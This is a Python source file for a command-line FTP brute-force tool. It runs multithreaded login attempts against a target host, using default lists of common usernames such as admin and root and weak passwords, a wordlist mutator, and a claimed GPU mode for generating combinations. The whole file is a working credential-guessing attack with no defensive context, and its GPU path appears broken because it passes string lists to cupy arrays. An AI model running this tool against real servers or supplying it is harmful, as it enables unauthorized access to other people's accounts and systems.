import ftplib
import concurrent.futures
import itertools
import argparse
import time
from pathlib import Path
import numpy as np
try:
    import cupy as cp
    GPU_AVAILABLE = True
except ImportError:
    GPU_AVAILABLE = False

class FTPBruteForcer:
    def __init__(self, host, port=21, timeout=5):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.found = False
        self.result = None

    def try_credentials(self, username, password):
        if self.found:
            return None
        try:
            ftp = ftplib.FTP(timeout=self.timeout)
            ftp.connect(self.host, self.port)
            ftp.login(username, password)
            ftp.quit()
            return (username, password)
        except:
            return None

    def generate_combinations_cpu(self, usernames, passwords, max_combinations=1000000):
        combinations = []
        for username in usernames:
            for password in passwords:
                combinations.append((username, password))
                if len(combinations) >= max_combinations:
                    return combinations
        return combinations

    def generate_combinations_gpu(self, usernames, passwords):
        if not GPU_AVAILABLE:
            return self.generate_combinations_cpu(usernames, passwords)

        usernames_gpu = cp.array(usernames)
        passwords_gpu = cp.array(passwords)

        u_grid, p_grid = cp.meshgrid(usernames_gpu, passwords_gpu)
        combinations = cp.stack([u_grid.ravel(), p_grid.ravel()], axis=1)

        return cp.asnumpy(combinations)

    def brute_force_cpu(self, usernames, passwords, max_workers=10):
        print(f"[CPU] Starting brute-force with {max_workers} threads...")

        combinations = list(itertools.product(usernames, passwords))
        total = len(combinations)
        print(f"[CPU] Testing {total} combinations...")

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_cred = {
                executor.submit(self.try_credentials, user, pwd): (user, pwd)
                for user, pwd in combinations
            }

            for i, future in enumerate(concurrent.futures.as_completed(future_to_cred), 1):
                if self.found:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break

                result = future.result()
                if result:
                    self.found = True
                    self.result = result
                    print(f"\n[SUCCESS] Found: {result[0]}:{result[1]}")
                    return result

                if i % 100 == 0:
                    print(f"[CPU] Tested: {i}/{total} ({i/total*100:.1f}%)", end='\r')

        print("\n[CPU] Brute-force completed - no valid credentials found")
        return None

    def brute_force_hybrid(self, usernames, passwords, batch_size=1000, max_workers=8):
        print("[HYBRID] Starting hybrid brute-force...")

        if GPU_AVAILABLE:
            print("[GPU] Using GPU for combination generation...")
            combinations = self.generate_combinations_gpu(usernames, passwords)
        else:
            print("[CPU] GPU not available - using CPU...")
            combinations = self.generate_combinations_cpu(usernames, passwords)

        total = len(combinations)
        print(f"[HYBRID] {total} combinations generated")

        for i in range(0, total, batch_size):
            if self.found:
                break

            batch = combinations[i:i+batch_size]

            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = [executor.submit(self.try_credentials, user, pwd)
                          for user, pwd in batch]

                for future in concurrent.futures.as_completed(futures):
                    if self.found:
                        break

                    result = future.result()
                    if result:
                        self.found = True
                        self.result = result
                        print(f"\n[SUCCESS] Found: {result[0]}:{result[1]}")
                        return result

            progress = min(i + batch_size, total)
            print(f"[HYBRID] Tested: {progress}/{total} ({progress/total*100:.1f}%)", end='\r')

        print("\n[HYBRID] Brute-force completed")
        return None

def load_wordlist(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        print(f"[ERROR] File not found: {filepath}")
        return []

def generate_simple_wordlist(base_words, variations=[]):
    wordlist = set(base_words)

    for word in base_words:
        wordlist.add(word.lower())
        wordlist.add(word.upper())
        wordlist.add(word.capitalize())

        for i in range(10):
            wordlist.add(f"{word}{i}")
            wordlist.add(f"{word}{i}{i}")
            if i < 100:
                wordlist.add(f"{word}{i:02d}")

    for var in variations:
        wordlist.add(var)

    return list(wordlist)

def main():
    parser = argparse.ArgumentParser(description='FTP Brute-Force Tool')
    parser.add_argument('host', help='FTP Server Hostname/IP')
    parser.add_argument('-p', '--port', type=int, default=21, help='FTP Port (default: 21)')
    parser.add_argument('-u', '--users', help='User list file')
    parser.add_argument('-w', '--passwords', help='Password list file')
    parser.add_argument('-g', '--generate', action='store_true', help='Generate wordlists')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-m', '--mode', choices=['cpu', 'hybrid'], default='hybrid',
                       help='Mode: cpu or hybrid (default: hybrid)')

    args = parser.parse_args()

    if args.users:
        usernames = load_wordlist(args.users)
    else:
        usernames = ['admin', 'root', 'user', 'ftp', 'test', 'guest', 'anonymous']
        if args.generate:
            usernames = generate_simple_wordlist(usernames, ['administrator', 'sysadmin'])

    if args.passwords:
        passwords = load_wordlist(args.passwords)
    else:
        passwords = ['123456', 'password', 'admin', '12345678', 'qwerty', '123456789']
        if args.generate:
            passwords = generate_simple_wordlist(passwords,
                ['password123', 'admin123', 'root123', 'test123', '12345', '111111'])

    print(f"[INFO] Target: {args.host}:{args.port}")
    print(f"[INFO] Users: {len(usernames)}")
    print(f"[INFO] Passwords: {len(passwords)}")

    brute_forcer = FTPBruteForcer(args.host, args.port)

    if args.mode == 'cpu':
        brute_forcer.brute_force_cpu(usernames, passwords, args.threads)
    else:
        brute_forcer.brute_force_hybrid(usernames, passwords, max_workers=args.threads)

if __name__ == "__main__":
    main()
